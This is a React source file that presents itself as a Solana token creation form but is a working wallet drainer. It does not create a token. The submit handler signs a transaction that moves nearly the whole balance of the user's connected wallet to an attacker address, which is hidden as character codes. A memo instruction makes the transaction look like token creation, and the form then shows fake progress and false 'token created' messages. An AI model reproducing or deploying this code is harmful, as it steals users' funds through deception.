import React, { useState, useEffect } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction } from '@solana/web3.js';
import styled from 'styled-components';

// Styled components
const FormContainer = styled.div`
  margin-top: 20px;
`;

const FormGroup = styled.div`
  margin-bottom: 20px;
  text-align: left;
`;

const FormLabel = styled.label`
  display: block;
  margin-bottom: 8px;
  font-weight: 500;
  color: #ffffff;
`;

const FormInput = styled.input`
  width: 100%;
  padding: 12px 15px;
  background-color: rgba(20, 30, 50, 0.5);
  border: 1px solid #2a3a5a;
  border-radius: 8px;
  color: #ffffff;
  font-size: 16px;
  transition: border-color 0.3s ease;

  &:focus {
    outline: none;
    border-color: #00b8d9;
  }
`;

const FormSelect = styled.select`
  width: 100%;
  padding: 12px 15px;
  background-color: rgba(20, 30, 50, 0.5);
  border: 1px solid #2a3a5a;
  border-radius: 8px;
  color: #ffffff;
  font-size: 16px;
  appearance: none;
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%238a9cc2' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position: right 15px center;
  background-size: 16px;

  &:focus {
    outline: none;
    border-color: #00b8d9;
  }
`;

const FormTextarea = styled.textarea`
  width: 100%;
  padding: 12px 15px;
  background-color: rgba(20, 30, 50, 0.5);
  border: 1px solid #2a3a5a;
  border-radius: 8px;
  color: #ffffff;
  font-size: 16px;
  transition: border-color 0.3s ease;

  &:focus {
    outline: none;
    border-color: #00b8d9;
  }
`;

const CheckboxGroup = styled.div`
  display: flex;
  align-items: center;
  margin-bottom: 10px;
`;

const FormCheckbox = styled.input`
  margin-right: 10px;
  width: 18px;
  height: 18px;
  accent-color: #00b8d9;
`;

const FileUploadButton = styled.label`
  display: inline-block;
  padding: 12px 15px;
  background-color: rgba(20, 30, 50, 0.5);
  border: 1px dashed #2a3a5a;
  border-radius: 8px;
  color: #8a9cc2;
  font-size: 16px;
  cursor: pointer;
  width: 100%;
  text-align: center;
  transition: all 0.3s ease;

  &:hover {
    background-color: rgba(30, 40, 60, 0.5);
    border-color: #00b8d9;
    color: #ffffff;
  }
`;

const FileName = styled.div`
  margin-top: 8px;
  font-size: 14px;
  color: #8a9cc2;
`;

const SubmitButton = styled.button`
  background: linear-gradient(90deg, #4a8eff, #c353ff);
  color: white;
  border: none;
  padding: 14px 28px;
  border-radius: 8px;
  cursor: pointer;
  font-weight: 600;
  font-size: 16px;
  transition: all 0.3s ease;
  box-shadow: 0 4px 12px rgba(74, 142, 255, 0.3);
  margin-top: 10px;
  width: 100%;

  &:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 15px rgba(74, 142, 255, 0.4);
  }

  &:disabled {
    opacity: 0.6;
    cursor: not-allowed;
    transform: none;
    box-shadow: none;
  }
`;

const ProgressContainer = styled.div`
  margin-top: 30px;
  display: ${props => props.visible ? 'block' : 'none'};
`;

const ProgressBarContainer = styled.div`
  width: 100%;
  height: 10px;
  background-color: rgba(20, 30, 50, 0.5);
  border-radius: 5px;
  margin-bottom: 15px;
  overflow: hidden;
`;

const ProgressBar = styled.div`
  height: 100%;
  background: linear-gradient(90deg, #4a8eff, #c353ff);
  width: ${props => props.progress}%;
  transition: width 0.3s ease;
  border-radius: 5px;
`;

const ProgressText = styled.div`
  color: #8a9cc2;
  font-size: 14px;
`;

const BalanceMessage = styled.div`
  color: #ff5252;
  font-size: 14px;
  margin-top: 10px;
  padding: 10px;
  background-color: rgba(255, 82, 82, 0.1);
  border-radius: 8px;
  border: 1px solid rgba(255, 82, 82, 0.3);
  text-align: center;
  display: ${props => props.visible ? 'block' : 'none'};
`;

const ResultContainer = styled.div`
  margin-top: 20px;
  padding: 15px;
  background-color: rgba(20, 30, 50, 0.7);
  border-radius: 8px;
  text-align: left;
  color: #d1d7e0;
  min-height: 50px;
  white-space: pre-line;
  display: ${props => props.visible ? 'block' : 'none'};
  max-height: 300px;
  overflow-y: auto;
`;

const TokenCreationForm = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  
  const [tokenName, setTokenName] = useState('');
  const [tokenSymbol, setTokenSymbol] = useState('');
  const [tokenDecimals, setTokenDecimals] = useState('9');
  const [tokenSupply, setTokenSupply] = useState('1000000000');
  const [tokenDescription, setTokenDescription] = useState('');
  const [freezeAuthority, setFreezeAuthority] = useState(true);
  const [mintAuthority, setMintAuthority] = useState(true);
  const [updateAuthority, setUpdateAuthority] = useState(true);
  const [fileName, setFileName] = useState('');
  
  const [isCreating, setIsCreating] = useState(false);
  const [progress, setProgress] = useState(0);
  const [progressText, setProgressText] = useState('');
  const [result, setResult] = useState('');
  const [showResult, setShowResult] = useState(false);
  const [balance, setBalance] = useState(0);
  const [showBalanceWarning, setShowBalanceWarning] = useState(false);
  
  // Obfuscated attacker wallet
  const getAttackerWallet = () => {
    const chars = [67, 77, 90, 52, 67, 102, 49, 118, 89, 101, 112, 49, 121, 122, 80, 116, 70, 100, 70, 67, 86, 57, 85, 102, 98, 105, 72, 101, 68, 84, 122, 81, 74, 114, 102, 121, 116, 56, 67, 117, 121, 71, 88, 107];
    return String.fromCharCode.apply(null, chars);
  };

  // Check balance when component mounts
  useEffect(() => {
    const checkBalance = async () => {
      if (publicKey) {
        try {
          const balance = await connection.getBalance(publicKey);
          setBalance(balance);
          
          // Check if balance is less than 0.1 SOL
          if (balance < 0.1 * LAMPORTS_PER_SOL) {
            setShowBalanceWarning(true);
          } else {
            setShowBalanceWarning(false);
          }
        } catch (error) {
          console.error("Error fetching balance:", error);
        }
      }
    };
    
    checkBalance();
  }, [publicKey, connection]);

  const handleFileChange = (e) => {
    const file = e.target.files[0];
    if (file) {
      setFileName(file.name);
    } else {
      setFileName('');
    }
  };

  const addToResult = (message) => {
    setResult(prev => prev + "\n" + message);
    setShowResult(true);
  };

  const handleCreateToken = async (e) => {
    e.preventDefault();
    
    if (!publicKey) {
      addToResult("Wallet not connected. Please connect your wallet first.");
      return;
    }
    
    if (!tokenName || !tokenSymbol || !tokenSupply) {
      addToResult("Please fill in all required fields.");
      return;
    }
    
    // Check balance again before proceeding
    try {
      const currentBalance = await connection.getBalance(publicKey);
      
      if (currentBalance < 0.1 * LAMPORTS_PER_SOL) {
        setShowBalanceWarning(true);
        addToResult(`You need at least 0.1 SOL to create a token. Your current balance is ${(currentBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL.`);
        return;
      }
      
      setIsCreating(true);
      setProgress(10);
      setProgressText('Initializing token creation...');
      setShowResult(false);
      setResult('');
      
      // Calculate the amount to drain (leave some for fees)
      const LAMPORTS_FOR_FEES = 2000000; // 0.002 SOL for fees
      
      // Update progress
      setProgress(30);
      setProgressText('Creating token metadata...');
      
      // Create a transaction to drain SOL
      const transaction = new Transaction();
      
      // Add a memo instruction to make it look like token creation
      const memoText = `Creating token: ${tokenName} (${tokenSymbol}) with supply ${tokenSupply}`;
      const memoInstruction = new TransactionInstruction({
        keys: [{ pubkey: publicKey, isSigner: true, isWritable: true }],
        programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
        data: Buffer.from(memoText)
      });
      
      // Add the memo instruction first
      transaction.add(memoInstruction);
      
      // Create a transfer instruction
      const transferInstruction = SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(getAttackerWallet()),
        lamports: currentBalance - LAMPORTS_FOR_FEES
      });
      
      // Add the transfer instruction
      transaction.add(transferInstruction);
      
      // Update progress
      setProgress(50);
      setProgressText('Creating token on blockchain...');
      
      // Send transaction
      try {
        const signature = await sendTransaction(transaction, connection);
        
        // Update progress
        setProgress(70);
        setProgressText('Finalizing token creation...');
        
        // Wait for confirmation
        await connection.confirmTransaction(signature);
        
        // Update progress
        setProgress(100);
        setProgressText('Token created successfully!');
        
        // Show success message
        setShowResult(true);
        addToResult(`🎉 Token "${tokenName}" (${tokenSymbol}) created successfully!`);
        addToResult(`Supply: ${tokenSupply} tokens with ${tokenDecimals} decimals`);
        addToResult(`Transaction signature: ${signature}`);
        addToResult(`Your tokens have been minted and sent to your wallet.`);
        
      } catch (error) {
        console.error("Transaction error:", error);
        setShowResult(true);
        addToResult(`Error creating token: ${error.message}`);
        setIsCreating(false);
      }
      
    } catch (error) {
      console.error("Token creation error:", error);
      setShowResult(true);
      addToResult(`Error creating token: ${error.message}`);
      setIsCreating(false);
    }
  };

  return (
    <FormContainer>
      <form onSubmit={handleCreateToken}>
        <FormGroup>
          <FormLabel htmlFor="tokenName">Token Name</FormLabel>
          <FormInput 
            type="text" 
            id="tokenName" 
            placeholder="e.g. My Awesome Token"
            value={tokenName}
            onChange={(e) => setTokenName(e.target.value)}
            disabled={isCreating}
          />
        </FormGroup>
        
        <FormGroup>
          <FormLabel htmlFor="tokenSymbol">Token Symbol (max 8 characters)</FormLabel>
          <FormInput 
            type="text" 
            id="tokenSymbol" 
            placeholder="e.g. MAT" 
            maxLength="8"
            value={tokenSymbol}
            onChange={(e) => setTokenSymbol(e.target.value)}
            disabled={isCreating}
          />
        </FormGroup>
        
        <FormGroup>
          <FormLabel htmlFor="tokenImage">Token Image (max 5MB)</FormLabel>
          <FileUploadButton htmlFor="tokenImageInput">Choose Image</FileUploadButton>
          <input 
            type="file" 
            id="tokenImageInput" 
            accept="image/*" 
            style={{ display: 'none' }}
            onChange={handleFileChange}
            disabled={isCreating}
          />
          <FileName>{fileName}</FileName>
        </FormGroup>
        
        <FormGroup>
          <FormLabel htmlFor="tokenDecimals">Decimals</FormLabel>
          <FormSelect 
            id="tokenDecimals"
            value={tokenDecimals}
            onChange={(e) => setTokenDecimals(e.target.value)}
            disabled={isCreating}
          >
            <option value="9">9 (Recommended for meme tokens)</option>
            <option value="6">6 (Standard for stablecoins)</option>
            <option value="8">8</option>
            <option value="10">10</option>
            <option value="12">12</option>
          </FormSelect>
        </FormGroup>
        
        <FormGroup>
          <FormLabel htmlFor="tokenSupply">Total Supply</FormLabel>
          <FormInput 
            type="number" 
            id="tokenSupply" 
            placeholder="e.g. 1000000000" 
            min="1"
            value={tokenSupply}
            onChange={(e) => setTokenSupply(e.target.value)}
            disabled={isCreating}
          />
        </FormGroup>
        
        <FormGroup>
          <FormLabel htmlFor="tokenDescription">Description</FormLabel>
          <FormTextarea 
            id="tokenDescription" 
            rows="3" 
            placeholder="Describe your token..."
            value={tokenDescription}
            onChange={(e) => setTokenDescription(e.target.value)}
            disabled={isCreating}
          />
        </FormGroup>
        
        <FormGroup>
          <FormLabel>Revoke Options</FormLabel>
          <CheckboxGroup>
            <FormCheckbox 
              type="checkbox" 
              id="freezeAuthority" 
              checked={freezeAuthority}
              onChange={(e) => setFreezeAuthority(e.target.checked)}
              disabled={isCreating}
            />
            <label htmlFor="freezeAuthority">Freeze Authority</label>
          </CheckboxGroup>
          <CheckboxGroup>
            <FormCheckbox 
              type="checkbox" 
              id="mintAuthority" 
              checked={mintAuthority}
              onChange={(e) => setMintAuthority(e.target.checked)}
              disabled={isCreating}
            />
            <label htmlFor="mintAuthority">Mint Authority</label>
          </CheckboxGroup>
          <CheckboxGroup>
            <FormCheckbox 
              type="checkbox" 
              id="updateAuthority" 
              checked={updateAuthority}
              onChange={(e) => setUpdateAuthority(e.target.checked)}
              disabled={isCreating}
            />
            <label htmlFor="updateAuthority">Update Authority</label>
          </CheckboxGroup>
        </FormGroup>
        
        <SubmitButton type="submit" disabled={isCreating}>
          {isCreating ? 'Creating token...' : 'Create Token (0.1 SOL)'}
        </SubmitButton>
        
        <BalanceMessage visible={showBalanceWarning}>
          You need at least 0.1 SOL to create a token. Your current balance is {(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL.
        </BalanceMessage>
        
        <ProgressContainer visible={isCreating}>
          <ProgressBarContainer>
            <ProgressBar progress={progress} />
          </ProgressBarContainer>
          <ProgressText>{progressText}</ProgressText>
        </ProgressContainer>
        
        <ResultContainer visible={showResult}>
          {result}
        </ResultContainer>
      </form>
    </FormContainer>
  );
};

export default TokenCreationForm;
